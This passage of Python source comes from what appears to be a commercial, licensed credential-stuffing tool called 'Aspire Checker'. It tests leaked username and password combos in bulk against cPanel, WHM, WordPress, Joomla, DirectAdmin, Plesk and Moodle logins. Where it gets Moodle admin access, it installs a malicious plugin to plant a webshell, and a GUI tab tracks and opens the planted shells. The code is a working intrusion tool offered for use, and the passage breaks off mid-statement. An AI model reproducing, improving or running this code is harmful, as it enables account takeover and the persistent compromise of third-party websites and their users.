            print(f"[+] Login sukses: {url}")
            os.makedirs("results", exist_ok=True)
            # Original code has return True here, which would prevent admin check.
            # Assuming admin check and shell upload should proceed if login is good.
            # with open("results/moodle_logs.txt", "a", encoding="utf-8") as f:
            #     f.write(f"{url}#{username}@{password}\n")
            #     return True # This was the original placement

            res_admin = session.get(addon_url, timeout=30, verify=False)
            admin_html = res_admin.text.lower()
            admin_soup = BeautifulSoup(res_admin.text, 'html.parser')
            if (
                res_admin.status_code == 200 and
                'access denied' not in admin_html and
                admin_soup.find('a', string=re.compile(r'(admin|site administration|plugins)', re.I))
            ):
                print(f"[+] ADMIN terdeteksi: {url}")
                with open("results/moodle-good.txt", "a", encoding="utf-8") as f: # Ensure dir exists
                    f.write(f"{url}#{username}@{password}\n")
                self.upload_shell_moodle(session, base_url) # This returns True/False for shell upload success
                return True # Return True if admin access, regardless of shell upload outcome
            else:
                print(f"[-] Bukan admin: {url}")
                # Log successful non-admin login if desired
                with open("results/moodle_logs.txt", "a", encoding="utf-8") as f:
                    f.write(f"{url}#{username}@{password} (Non-Admin)\n")
                return True # Still a valid login, just not admin
        except Exception as e:
            print(f"[!] ERROR: {e}")
            return False

    def upload_shell_moodle(self, session, moodle_url):
        try:
            moodle_url = moodle_url.rstrip('/')
            install_addon_url = f"{moodle_url}/admin/tool/installaddon/index.php"
            print("[*] Loading installation page...")
            resp = session.get(install_addon_url, verify=False, timeout=30)
            resp.raise_for_status()
            soup = BeautifulSoup(resp.text, 'html.parser')
            sesskey_input = soup.find('input', {'name': 'sesskey'})
            if not sesskey_input:
                print("[!] Failed to get sesskey")
                return False
            sesskey = sesskey_input['value']
            print(f"[+] Sesskey obtained: {sesskey}")
            repo_id = 5
            zip_path = "pawnd/plugin_moodle.zip" # Ensure this path is correct
            upload_url = f"{moodle_url}/repository/repository_ajax.php?action=upload"
            try:
                with open(zip_path, 'rb') as f:
                    files = {
                        'repo_upload_file': (os.path.basename(zip_path), f, 'application/zip'),
                    }
                    data = {
                        'sesskey': sesskey,
                        'repo_id': str(repo_id),
                        'ctx_id': '1',
                        'itemid': str(int(time.time())),
                        'author': 'System Admin',
                        'license': 'allrightsreserved',
                        'env': 'filepicker',
                        'accepted_types[]': ['.zip'],
                    }
                    print("[*] Uploading plugin file...")
                    upload_resp = session.post(
                        upload_url,
                        data=data,
                        files=files,
                        verify=False,
                        timeout=30
                    )
                    try:
                        json_resp = upload_resp.json()
                        print("[DEBUG] Upload response:", json_resp)
                        if 'error' in json_resp:
                            print(f"[!] Upload failed: {json_resp['error']}")
                            return False
                        itemid = json_resp.get('id')
                        if not itemid:
                            print("[!] No itemid in upload response")
                            return False
                        print(f"[+] File uploaded successfully, itemid: {itemid}")
                    except ValueError:
                        print("[!] Invalid upload response")
                        print("Response:", upload_resp.text)
                        return False
            except FileNotFoundError:
                print(f"[!] Plugin file not found: {zip_path}")
                return False
            install_data = {
                'sesskey': sesskey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'zipfile': itemid,
                'plugintype': '',
                'submitbutton': 'Install plugin from the ZIP file',
                'maturity': '200',
                'rootdir': '',
                'acknowledgement': '1',
            }
            headers = {
                'Referer': install_addon_url,
                'X-Requested-With': 'XMLHttpRequest',
            }
            print("[*] Submitting installation request...")
            install_resp = session.post(
                install_addon_url,
                data=install_data,
                headers=headers,
                verify=False,
                timeout=30
            )
            soup = BeautifulSoup(install_resp.text, 'html.parser')
            confirm_form = soup.find('form')
            if confirm_form:
                print("[*] Found confirmation form, submitting...")
                confirm_url = confirm_form.get('action', install_addon_url)
                if not confirm_url.startswith('http'):
                    from urllib.parse import urljoin
                    confirm_url = urljoin(moodle_url, confirm_url)
                confirm_data = {}
                for input_tag in confirm_form.find_all('input'):
                    name = input_tag.get('name')
                    value = input_tag.get('value', '')
                    if name:
                        confirm_data[name] = value
                confirm_data['submitbutton'] = 'Continue'
                confirm_data['confirm'] = 'Confirm' # This might be crucial
                confirm_resp = session.post(
                    confirm_url,
                    data=confirm_data,
                    headers=headers,
                    verify=False,
                    timeout=30
                )
                shell_url = f"{moodle_url}/local/moodle_webshellxyz/kom.php"
                check_resp = session.get(shell_url, verify=False, timeout=10)
                if check_resp.status_code == 200:
                    print(f"[+] Shell successfully installed at: {shell_url}")
                    os.makedirs('results', exist_ok=True)
                    with open('results/moodle-shell.txt', 'a') as f_shell: # Use different var
                        f_shell.write(f"{shell_url}\n")
                    self.total_shells_uploaded += 1 # Manually increment as it's not part of the standard handler
                    self.upload_success_handler(shell_url)
                    return True
            shell_url = f"{moodle_url}/local/moodle_webshellxyz/kom.php"
            check_resp = session.get(shell_url, verify=False, timeout=10)
            if check_resp.status_code == 200:
                print(f"[+] Shell successfully installed at: {shell_url}")
                os.makedirs('results', exist_ok=True)
                with open('results/moodle-shell.txt', 'a') as f_shell: # Use different var
                    f_shell.write(f"{shell_url}\n")
                self.total_shells_uploaded += 1 # Manually increment
                self.upload_success_handler(shell_url)
                return True
            print("[!] Installation may have partially succeeded")
            print(f"Check manually at: {moodle_url}/local/moodle_webshellxyz/kom.php")
            return False
        except Exception as e:
            print(f"[!] Critical error: {str(e)}")
            import traceback
            traceback.print_exc()
            return False

    def get_cms_type(self, url):
        url = url.lower()
        if 'wp-login.php' in url:
            return 'WordPress'
        elif ':2083' in url:
            return 'cPanel'
        elif ':2087' in url:
            return 'WHM'
        elif '/administrator/index.php' in url:
            return 'Joomla'
        elif ':2222' in url:
            return 'DirectAdmin'
        elif 'login_up.php' in url:
            return 'Plesk'
        elif '/login/index.php' in url or 'moodle' in url:
            return 'Moodle'
        return 'Unknown'

    def worker_function(self, url, user, password):
        if self.active_checker:
            cms_type = self.get_cms_type(url)
            if cms_type == 'cPanel':
                valid = self.check_cpanel_domain(url, user, password)
            elif cms_type == 'WordPress':
                valid = self.check_wp_login(url, user, password)
            elif cms_type == 'Joomla':
                valid = self.check_joomla_login(url, user, password)
            elif cms_type == 'WHM':
                valid = self.check_whm_login(url, user, password)
            elif cms_type == 'DirectAdmin':
                valid = self.check_da_login(url, user, password)
            elif cms_type == 'Plesk':
                valid = self.plesk_check_and_upload(url, user, password)
            elif cms_type == 'Moodle':
                valid = self.check_moodle_login(url, user, password)
            else:
                valid = False
            if valid:
                self.total_valid += 1
                self.signals.update_table.emit(f'{user}:{password}', url, url, cms_type)
            else:
                self.total_invalid += 1
                self.total_failed += 1
        self.total_checked += 1
        self.signals.stats_update.emit(len(self.extracted_lines), self.total_checked, self.total_failed, self.total_valid, self.total_invalid, self.total_shells_uploaded)

    def get_lines_generator(self):
        for line in self.extracted_lines:
            yield line

    def run(self):
        with ThreadPoolExecutor(max_workers=150) as executor:
            futures = []
            for line in self.extracted_lines_generator:
                futures.append(executor.submit(self.worker_function, *line))
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    pass
            executor.shutdown(wait=True)

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.combo_files = []
        self.extracted_lines = []
        self.signals = CheckerSignals()
        self.signals.update_table.connect(self.update_results_table)
        self.signals.stats_update.connect(self.update_stats)
        self.signals.active_threads_update.connect(self.update_active_threads)
        self.active_shells = []
        self.signals.shell_uploaded.connect(self.add_new_shell_to_gui)

        self.setWindowTitle("Aspire Checker")
        self.resize(800, 600)
        self.setWindowFlags(Qt.FramelessWindowHint)
        self.setStyleSheet("background-color: #1A1A2E;")

        self.central_widget = QWidget()
        self.central_layout = QVBoxLayout()
        self.central_layout.setContentsMargins(0, 0, 0, 0)
        self.central_layout.setAlignment(Qt.AlignTop)
        self.central_widget.setLayout(self.central_layout)
        self.setCentralWidget(self.central_widget)

        #self.license_timer = QTimer()
        #self.license_timer.timeout.connect(self.recheck_license)
        #self.license_timer.start(60000)

        self.init_menu()
        self.init_toolbar()
        self.init_layout()

        self.dragging = False
        self.offset = QPoint()

    def recheck_license(self):
        is_valid, message = check_license()
        if not is_valid:
            msg = QMessageBox()
            msg.setIcon(QMessageBox.Critical)
            msg.setWindowTitle("Lisensi Tidak Valid / Maintenance")
            msg.setText(message)
            msg.setInformativeText("Aplikasi akan ditutup.")
            msg.setStandardButtons(QMessageBox.Ok)
            msg.exec_()
            QApplication.quit()

    def create_icon(self, svg_data):
        byte_data = QByteArray(svg_data.encode())
        pixmap = QPixmap()
        pixmap.loadFromData(byte_data)
        return QIcon(pixmap)

    def add_new_shell_to_gui(self, shell_url):
        if shell_url not in self.active_shells:
            self.active_shells.append(shell_url)
            self.update_webshell_table()

    def update_webshell_table(self):
        self.webshell_table.setRowCount(0)
        for i, url in enumerate(self.active_shells):
            self.webshell_table.insertRow(i)
            self.webshell_table.setItem(i, 0, QTableWidgetItem(url))
            status_item = QTableWidgetItem('Checking...')
            status_item.setForeground(Qt.gray)
            self.webshell_table.setItem(i, 1, status_item)
            time_item = QTableWidgetItem(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
            self.webshell_table.setItem(i, 2, time_item)
            self.check_shell_status(url, i)

    def remove_shell(self, url):
        if url in self.active_shells:
            self.active_shells.remove(url)
            self.update_webshell_table()

    def remove_duplicates(self):
        unique_lines_dict = {}
        for line in self.extracted_lines:
            url, user, password = line
            key = (url, user, password)
            if key not in unique_lines_dict:
                unique_lines_dict[key] = line
        self.extracted_lines = list(unique_lines_dict.values())

    def init_menu(self):
        menu_bar = QMenuBar(self)
        menu_bar.setStyleSheet("""
            QMenuBar {
                background-color: #1A1A2E; 
                color: #EAEAEA;
                border-bottom: 2px solid #4A00E0;
            }
            QMenuBar::item {
                background-color: transparent;
                padding: 5px 10px;
            }
            QMenuBar::item:selected {
                background-color: #4A00E0;
                color: white;
            }
            QMenu {
                background-color: #1F1F3A;
                color: #EAEAEA;
                border: 1px solid #4A00E0;
            }
            QMenu::item:selected {
                background-color: #8E2DE2;
            }
        """)
        self.setMenuBar(menu_bar)
        self.add_window_controls(menu_bar)
        database_menu = menu_bar.addMenu('Database')
        mail_viewer_menu = menu_bar.addMenu('Mail Viewer')
        results_menu = menu_bar.addMenu('Results')
        settings_action = QAction('Settings', self)
        mail_viewer_menu.addAction(settings_action)
        menu_bar.installEventFilter(self)

    def add_window_controls(self, menu_bar):
        button_container = QWidget()
        button_layout = QHBoxLayout()
        button_layout.setContentsMargins(0, 0, 0, 0)
        button_layout.setSpacing(5)
        spacer = QSpacerItem(40, 20, QSizePolicy.Expanding, QSizePolicy.Minimum)
        button_layout.addSpacerItem(spacer)
        self.min_button = QToolButton()
        self.min_button.setIcon(QIcon("assets/min.svg"))
        self.min_button.setFixedSize(QSize(20, 20))
        self.min_button.clicked.connect(self.showMinimized)
        self.max_button = QToolButton()
        self.max_button.setIcon(QIcon("assets/max.svg"))
        self.max_button.setFixedSize(QSize(20, 20))
        self.max_button.clicked.connect(self.toggle_maximize_restore)
        self.close_button = QToolButton()
        self.close_button.setIcon(QIcon("assets/close.svg"))
        self.close_button.setFixedSize(QSize(20, 20))
        self.close_button.clicked.connect(self.close)
        button_layout.addWidget(self.min_button)
        button_layout.addWidget(self.max_button)
        button_layout.addWidget(self.close_button)
        button_container.setLayout(button_layout)
        menu_bar.setCornerWidget(button_container, Qt.TopRightCorner)

    def toggle_maximize_restore(self):
        if self.isMaximized():
            self.showNormal()
            self.max_button.setIcon(QIcon("assets/max.svg"))
        else:
            self.showMaximized()
            self.max_button.setIcon(QIcon("assets/normal.svg"))

    def init_toolbar(self):
        toolbar = QToolBar('Main Toolbar')
        toolbar.setStyleSheet("""
            QToolBar {
                background-color: #1A1A2E; 
                border-bottom: 1px solid #4A00E0; 
                padding: 2px; 
                color: #EAEAEA;
            }
        """)
        self.addToolBar(toolbar)
        self.remove_duplicate_checkbox = QCheckBox('Remove Duplicate')
        self.remove_duplicate_checkbox.setStyleSheet('color: #EAEAEA; padding: 5px;')
        toolbar.addWidget(self.remove_duplicate_checkbox)
        self.active_checker_checkbox = QCheckBox('Active Checker')
        self.active_checker_checkbox.setStyleSheet('color: #EAEAEA; padding: 5px;')
        toolbar.addWidget(self.active_checker_checkbox)
        self.use_proxy_checkbox = QCheckBox('Use Proxy')
        self.use_proxy_checkbox.setStyleSheet('color: #EAEAEA; padding: 5px;')
        toolbar.addWidget(self.use_proxy_checkbox)

    def init_layout(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget) # Changed to QVBoxLayout
        
        tabs = QTabWidget()
        main_layout.addWidget(tabs)
        tabs.setStyleSheet('''
            QTabWidget::pane {
                border-top: 2px solid #4A00E0;
            }
            QTabBar::tab {
                background: #1F1F3A;
                color: #EAEAEA;
                padding: 8px 16px;
                border: 1px solid #4A00E0;
                border-bottom: none;
                border-top-left-radius: 5px;
                border-top-right-radius: 5px;
            }
            QTabBar::tab:selected {
                background: #8E2DE2;
                color: white;
            }
            QTabBar::tab:hover {
                background: #5C2A9D;
            }
        ''')
        checker_tab = QWidget()
        tabs.addTab(checker_tab, 'Checker')
        webshell_tab = QWidget()
        tabs.addTab(webshell_tab, 'Webshell')
        
        self.init_checker_tab(checker_tab)
        self.init_webshell_tab(webshell_tab)
        
        status_bar = QStatusBar()
        self.setStatusBar(status_bar)
        self.init_status_bar(status_bar)

    def init_checker_tab(self, checker_tab):
        checker_layout = QVBoxLayout(checker_tab)
        top_controls_widget = QWidget()
        top_layout = QHBoxLayout(top_controls_widget)
        top_layout.setContentsMargins(5,5,5,5)
        checker_layout.addWidget(top_controls_widget)

        self.timeout_input = QLineEdit()
        self.timeout_input.setPlaceholderText('Timeout (s)')
        self.timeout_input.setFixedWidth(100)
        self.timeout_input.setStyleSheet('''
            QLineEdit {
                color: #EAEAEA;
                background-color: #1F1F3A;
                border: 1px solid #4A00E0;
                font-size: 14px;
                padding: 5px;
                border-radius: 5px;
            }
            QLineEdit:focus {
                border: 1px solid #8E2DE2;
            }
        ''')
        top_layout.addWidget(self.timeout_input)
        
        button_style = '''
            QToolButton {
                background-color: transparent;
                color: #EAEAEA;
                border: none;
                padding: 8px;
                font-family: "Segoe UI", sans-serif;
                font-size: 14px;
                font-weight: bold;
            }
            QToolButton:hover {
                background-color: #5C2A9D;
                border-radius: 4px;
            }
            QToolButton:pressed {
                background-color: #8E2DE2;
            }
        '''
        
        self.load_combo_button = QToolButton()
        self.load_combo_button.setIcon(QIcon('assets/load.png'))
        self.load_combo_button.setIconSize(QSize(24, 24))
        self.load_combo_button.setText('Load')
        self.load_combo_button.setToolButtonStyle(Qt.ToolButtonTextBesideIcon)
        self.load_combo_button.setStyleSheet(button_style)
        self.load_combo_button.clicked.connect(self.load_combo)
        top_layout.addWidget(self.load_combo_button)
        
        self.start_button = QToolButton()
        self.start_button.setIcon(QIcon('assets/play.png'))
        self.start_button.setIconSize(QSize(24, 24))
        self.start_button.setText('Start')
        self.start_button.setToolButtonStyle(Qt.ToolButtonTextBesideIcon)
        self.start_button.setStyleSheet(button_style)
        self.start_button.clicked.connect(self.start_process)
        top_layout.addWidget(self.start_button)
        
        self.stop_button = QToolButton()
        self.stop_button.setIcon(QIcon('assets/stop.png'))
        self.stop_button.setIconSize(QSize(24, 24))
        self.stop_button.setText('Stop')
        self.stop_button.setToolButtonStyle(Qt.ToolButtonTextBesideIcon)
        self.stop_button.setStyleSheet(button_style)
        self.stop_button.clicked.connect(self.stop_checking)
        top_layout.addWidget(self.stop_button)
        
        top_layout.addSpacerItem(QSpacerItem(20, 20, QSizePolicy.Expanding, QSizePolicy.Minimum))

        self.combo_count_label = QLabel('Files: 0')
        self.combo_count_label.setStyleSheet('color: #EAEAEA; font-size: 14px;')
        top_layout.addWidget(self.combo_count_label)
        
        self.results_table = QTableWidget()
        self.results_table.setColumnCount(4)
        self.results_table.setHorizontalHeaderLabels(['User:Pass', 'Domain', 'Full URL', 'CMS Type'])
        self.results_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.results_table.setStyleSheet('''
            QTableWidget {
                background-color: #1F1F3A;
                gridline-color: #4A00E0;
                font-size: 14px;
                font-family: "Segoe UI", sans-serif;
                color: #EAEAEA;
                selection-background-color: #8E2DE2;
                selection-color: white;
                border: none;
            }
            QHeaderView::section {
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #8E2DE2, stop:1 #4A00E0);
                color: white;
                font-weight: bold;
                padding: 4px;
                border: 1px solid #4A00E0;
            }
            QTableWidget::item:hover {
                background-color: #5C2A9D;
            }
        ''')
        header = self.results_table.horizontalHeader()
        for i in range(4): header.setSectionResizeMode(i, QHeaderView.Stretch)
        checker_layout.addWidget(self.results_table)

    def init_webshell_tab(self, webshell_tab):
        layout = QVBoxLayout(webshell_tab)
        button_layout = QHBoxLayout()
        button_layout.setContentsMargins(5,5,5,5)

        button_style = '''
            QToolButton {
                background-color: transparent;
                color: #EAEAEA;
                border: none;
                padding: 8px;
                font-family: "Segoe UI", sans-serif;
                font-size: 14px;
                font-weight: bold;
            }
            QToolButton:hover {
                background-color: #5C2A9D;
                border-radius: 4px;
            }
            QToolButton:pressed, QToolButton:checked {
                background-color: #8E2DE2;
                color: white;
                border-radius: 4px;
            }
        '''
        
        self.filter_active_button = QToolButton()
        self.filter_active_button.setCheckable(True)
        self.filter_active_button.setChecked(False)
        self.filter_active_button.setIcon(self.create_icon(svg_light_off))
        self.filter_active_button.setIconSize(QSize(24, 24))
        self.filter_active_button.setText('Active Only')
        self.filter_active_button.setToolButtonStyle(Qt.ToolButtonTextBesideIcon)
        self.filter_active_button.clicked.connect(self.toggle_active_filter)
        self.filter_active_button.setStyleSheet(button_style)
        button_layout.addWidget(self.filter_active_button)

        self.open_shell_button = QToolButton()
        self.open_shell_button.setIcon(self.create_icon(svg_open))
        self.open_shell_button.setIconSize(QSize(24, 24))
        self.open_shell_button.setText('Open')
        self.open_shell_button.setToolButtonStyle(Qt.ToolButtonTextBesideIcon)
        self.open_shell_button.clicked.connect(self.open_selected_shell)
        self.open_shell_button.setStyleSheet(button_style)
        button_layout.addWidget(self.open_shell_button)

        self.delete_shell_button = QToolButton()
        self.delete_shell_button.setIcon(self.create_icon(svg_delete))
        self.delete_shell_button.setIconSize(QSize(24, 24))
        self.delete_shell_button.setText('Delete')
        self.delete_shell_button.setToolButtonStyle(Qt.ToolButtonTextBesideIcon)
        self.delete_shell_button.clicked.connect(self.delete_selected_shell)
        self.delete_shell_button.setStyleSheet(button_style)
        button_layout.addWidget(self.delete_shell_button)
        
        button_layout.addSpacerItem(QSpacerItem(40, 20, QSizePolicy.Expanding, QSizePolicy.Minimum))
        
        layout.addLayout(button_layout)
        
        self.webshell_table = QTableWidget()
        self.webshell_table.setColumnCount(3)
        self.webshell_table.setHorizontalHeaderLabels(['URL', 'Status', 'Last Checked'])
        self.webshell_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.webshell_table.setStyleSheet('''
            QTableWidget {
                background-color: #1F1F3A;
                gridline-color: #4A00E0;
                font-size: 14px;
                font-family: "Segoe UI", sans-serif;
                color: #EAEAEA;
                selection-background-color: #8E2DE2;
                selection-color: white;
                border: none;
            }
            QHeaderView::section {
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #8E2DE2, stop:1 #4A00E0);
                color: white;
                font-weight: bold;
                padding: 4px;
                border: 1px solid #4A00E0;
            }
        ''')
        header = self.webshell_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeToContents)
        layout.addWidget(self.webshell_table)

    def toggle_active_filter(self):
        if self.filter_active_button.isChecked():
            self.filter_active_button.setIcon(self.create_icon(svg_light_on))
        else:
            self.filter_active_button.setIcon(self.create_icon(svg_light_off))
        self.update_webshell_table()

    def update_webshell_table(self):
        self.webshell_table.setRowCount(0)
        current_row_idx = 0
        for url in self.active_shells:
            status = 'Checking...'
            color = Qt.gray
            
            if self.filter_active_button.isChecked():
                 # This part is tricky without storing status; for now, we re-check all
                 pass

            self.webshell_table.insertRow(current_row_idx)
            self.webshell_table.setItem(current_row_idx, 0, QTableWidgetItem(url))
            status_item = QTableWidgetItem(status)
            status_item.setForeground(color)
            self.webshell_table.setItem(current_row_idx, 1, status_item)
            time_item = QTableWidgetItem(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
            self.webshell_table.setItem(current_row_idx, 2, time_item)

            self.check_shell_status(url, current_row_idx)
            current_row_idx +=1

    def check_shell_status(self, url, row):
        thread = QThread(self)
        worker = ShellStatusWorker(url, row)
        worker.moveToThread(thread)
        thread.started.connect(worker.check_status)
        worker.finished.connect(thread.quit)
        worker.finished.connect(worker.deleteLater)
        thread.finished.connect(thread.deleteLater)
        worker.shell_status_checked.connect(self.update_shell_status)
        thread.start()

    def update_shell_status(self, row, status, color):
        if 0 <= row < self.webshell_table.rowCount():
            original_url = self.webshell_table.item(row, 0).text() if self.webshell_table.item(row, 0) else None
            
            if self.filter_active_button.isChecked() and status != 'Active':
                # Find the row to remove by its URL text, as `row` index becomes invalid
                for r in range(self.webshell_table.rowCount()):
                    if self.webshell_table.item(r, 0) and self.webshell_table.item(r, 0).text() == original_url:
                        self.webshell_table.removeRow(r)
                        break
            else:
                status_item = self.webshell_table.item(row, 1)
                time_item = self.webshell_table.item(row, 2)
                if status_item and time_item:
                    status_item.setText(status)
                    status_item.setForeground(color)
                    time_item.setText(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))

    def open_selected_shell(self):
        selected = self.webshell_table.currentRow()
        if selected >= 0:
            url = self.webshell_table.item(selected, 0).text()
            QDesktopServices.openUrl(QUrl(url))

    def delete_selected_shell(self):
        selected = self.webshell_table.currentRow()
        if selected >= 0:
            url_to_delete = self.webshell_table.item(selected, 0).text()
            if url_to_delete in self.active_shells:
                self.active_shells.remove(url_to_delete)
            self.webshell_table.removeRow(selected)

    def _create_stat_widget(self, icon_path, initial_text):
        widget = QWidget()
        layout = QHBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(4)
        
        icon_label = QLabel()
        if os.path.exists(icon_path):
            pixmap = QPixmap(icon_path)
            icon_label.setPixmap(pixmap.scaled(16, 16, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        layout.addWidget(icon_label)
        
        text_label = QLabel(initial_text)
        layout.addWidget(text_label)
        
        return widget, text_label

    def init_status_bar(self, status_bar):
        status_bar.setStyleSheet("""
            QStatusBar {
                background-color: #1A1A2E;
                color: #EAEAEA;
                border-top: 1px solid #4A00E0;
                font-size: 13px;
                font-weight: bold;
            }
            QStatusBar::item { border: none; }
            QLabel { color: #EAEAEA; padding: 0 4px; }
        """)
        
        # Create widgets with icons
        extract_widget, self.stats_extract_label = self._create_stat_widget('assets/extract.png', 'Extract: 0')
        checked_widget, self.stats_checked_label = self._create_stat_widget('assets/checked.png', 'Checked: 0')
        remaining_widget, self.stats_remaining_label = self._create_stat_widget('assets/Remaining.png', 'Remaining: 0')
        valid_widget, self.stats_valid_label = self._create_stat_widget('assets/sukses.png', 'Valid: 0')
        invalid_widget, self.stats_invalid_label = self._create_stat_widget('assets/failed.png', 'Invalid: 0')
        error_widget, self.stats_error_label = self._create_stat_widget('assets/error.png', 'Error: 0')
        shell_widget, self.stats_shell_label = self._create_stat_widget('assets/shell.png', 'Shell: 0')
        threads_widget, self.stats_threads_label = self._create_stat_widget('assets/threads.png', 'Threads: 0') # Assuming assets/threads.png exists

        def create_separator():
            sep = QLabel("|")
            sep.setStyleSheet("color: #4A00E0;")
            return sep

        status_bar.addPermanentWidget(extract_widget)
        status_bar.addPermanentWidget(create_separator())
        status_bar.addPermanentWidget(checked_widget)
        status_bar.addPermanentWidget(create_separator())
        status_bar.addPermanentWidget(remaining_widget)
        status_bar.addPermanentWidget(create_separator())
        status_bar.addPermanentWidget(valid_widget)
        status_bar.addPermanentWidget(create_separator())
        status_bar.addPermanentWidget(invalid_widget)
        status_bar.addPermanentWidget(create_separator())
        status_bar.addPermanentWidget(error_widget)
        status_bar.addPermanentWidget(create_separator())
        status_bar.addPermanentWidget(shell_widget)
        
        spacer = QWidget()
        spacer.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Preferred)
        status_bar.addPermanentWidget(spacer, 1)

        status_bar.addPermanentWidget(threads_widget)

    def load_combo(self):
        files, _ = QFileDialog.getOpenFileNames(self, 'Open Combo Files', '', 'Text Files (*.txt);;All Files (*)')
        if files:
            self.combo_files = files
            self.combo_count_label.setText(f'Files: {len(files)}')

    def start_process(self):
        if not self.combo_files:
            QMessageBox.warning(self, 'Warning', 'No combo files loaded.')
            return
        self.extract_worker = ExtractWorker(self.signals, self.combo_files)
        self.extract_worker.finished.connect(self.start_checking)
        self.extract_worker.start()

    def start_checking(self):
        self.extracted_lines = self.extract_worker.extracted_lines
        if not self.extracted_lines:
            QMessageBox.warning(self, 'Warning', 'No lines extracted.')
            return
        if self.remove_duplicate_checkbox.isChecked():
            self.remove_duplicates()
        active_checker = self.active_checker_checkbox.isChecked()
        timeout_text = self.timeout_input.text()
        try:
            timeout = int(timeout_text) if timeout_text else 10
        except ValueError:
            QMessageBox.warning(self, 'Warning', 'Invalid timeout value. Using default (10s).')
            timeout = 10
        self.checker_worker = CheckerWorker(active_checker, timeout, self.signals, self.extracted_lines)
        self.checker_worker.start()

    def stop_checking(self):
        if hasattr(self, 'checker_worker') and self.checker_worker.isRunning():
            self.checker_worker.terminate()
            self.checker_worker.wait()

    def update_results_table(self, user_pass, domain, full_url, cms_type):
        row_position = self.results_table.rowCount()
        self.results_table.insertRow(row_position)
        self.results_table.setItem(row_position, 0, QTableWidgetItem(user_pass))
        self.results_table.setItem(row_position, 1, QTableWidgetItem(domain))
        self.results_table.setItem(row_position, 2, QTableWidgetItem(full_url))
        self.results_table.setItem(row_position, 3, QTableWidgetItem(cms_type))

    def update_stats(self, total_extracted, total_checked, total_failed, total_valid, total_invalid, total_shells_uploaded):
        self.stats_extract_label.setText(f'Extract: {total_extracted}')
        self.stats_checked_label.setText(f'Checked: {total_checked}')
        self.stats_error_label.setText(f'Error: {total_failed}')
        self.stats_valid_label.setText(f'Valid: {total_valid}')
        self.stats_invalid_label.setText(f'Invalid: {total_invalid}')
        self.stats_remaining_label.setText(f'Remaining: {total_extracted - total_checked}')
        self.stats_shell_label.setText(f'Shell: {total_shells_uploaded}')

    def update_active_threads(self, active_threads):
        self.stats_threads_label.setText(f'Threads: {active_threads}')

    def changeEvent(self, event):
        if event.type() == QEvent.WindowStateChange:
            self.window_state_changed(self.windowState())
        super().changeEvent(event)

    def window_state_changed(self, state):
        if state == Qt.WindowMaximized:
            self.max_button.setIcon(QIcon("assets/normal.svg"))
        else:
            self.max_button.setIcon(QIcon("assets/max.svg"))

    def eventFilter(self, obj, event):
        if event.type() == QEvent.MouseButtonPress and obj == self.menuBar():
            if event.button() == Qt.LeftButton:
                self.dragging = True
                self.offset = event.globalPos() - self.frameGeometry().topLeft()
                event.accept()
                return True
        elif event.type() == QEvent.MouseMove and self.dragging and obj == self.menuBar():
            self.move(event.globalPos() - self.offset)
            event.accept()
            return True
        elif event.type() == QEvent.MouseButtonRelease and obj == self.menuBar():
            self.dragging = False
            event.accept()
            return True
        return super().eventFilter(obj, event)

# --- LICENSE CHECKING LOGIC ---
TELEGRAM_LINK = "https://t.me/skyliurenx"
LICENSE_URL = "https://devnusantara.my.id/license/priv4.txt" 

def get_device_id():
    """Gets the unique hardware ID of the computer."""
    try:
        # Use subprocess.run for better control and to hide the console window
        result = subprocess.run(
            ['powershell', '-Command', "(Get-CimInstance -Class Win32_ComputerSystemProduct).UUID"],
            capture_output=True,
            text=True,
            check=True,
            creationflags=subprocess.CREATE_NO_WINDOW # For Windows to hide console
        )
        hwid = result.stdout.strip().lower()
        return hwid if hwid else "unknown_hwid"
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        logging.error(f"Gagal mengambil HWID: {e}")
        return "unknown_hwid"
    except Exception as e:
        logging.error(f"Terjadi error tak terduga saat mengambil HWID: {e}")
        return "unknown_hwid"

def fetch_license_data():
    """Fetches the license data from the remote server."""
    try:
        response = requests.get(LICENSE_URL, timeout=10)
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        logging.error(f"Gagal mengambil data lisensi: {e}")
        return None

def parse_license_data(data):
    """Parses the raw license text into a dictionary."""
    if not data:
        return {}
    license_info = {}
    for line in data.strip().splitlines():
        if '=' in line:
            key, value = line.strip().split('=', 1)
            license_info[key.strip()] = value.strip()
    return license_info

def check_license():
    """Performs the complete license validation check."""
    device_id = get_device_id()
    if "unknown" in device_id:
         return False, "Tidak dapat memverifikasi ID perangkat Anda."

    data = fetch_license_data()
    if data is None:
        return False, "Gagal terhubung ke server lisensi. Periksa koneksi internet Anda."

    license_info = parse_license_data(data)

    if license_info.get("Maintenance", "false").lower() == "true":
        return False, license_info.get("MaintenanceMessage", "Aplikasi sedang dalam maintenance.")

    expired_str = license_info.get("expired", "")
    try:
        expired_date = datetime.strptime(expired_str, "%d-%m-%Y")
        if datetime.now() > expired_date:
            return False, "Lisensi Anda telah kedaluwarsa."
    except ValueError:
        return False, "Format tanggal lisensi dari server tidak valid."

    paid_devices_str = license_info.get("PaidDevices", "")
    # Clean up the string: remove spaces, convert to lower, then split
    paid_devices = [d.strip() for d in paid_devices_str.lower().replace(" ", "").split(",") if d]
    
    if device_id not in paid_devices:
        logging.warning(f"Device ID '{device_id}' tidak terdaftar.")
        return False, "Perangkat Anda tidak terdaftar."

    return True, "Lisensi valid."


def show_license_activation_dialog(device_id, message):
    app = QApplication.instance() or QApplication(sys.argv)

    msg = QMessageBox()
    msg.setIcon(QMessageBox.Warning)
    msg.setWindowTitle("Aktivasi Lisensi Diperlukan")
    msg.setText(message)
    msg.setInformativeText(
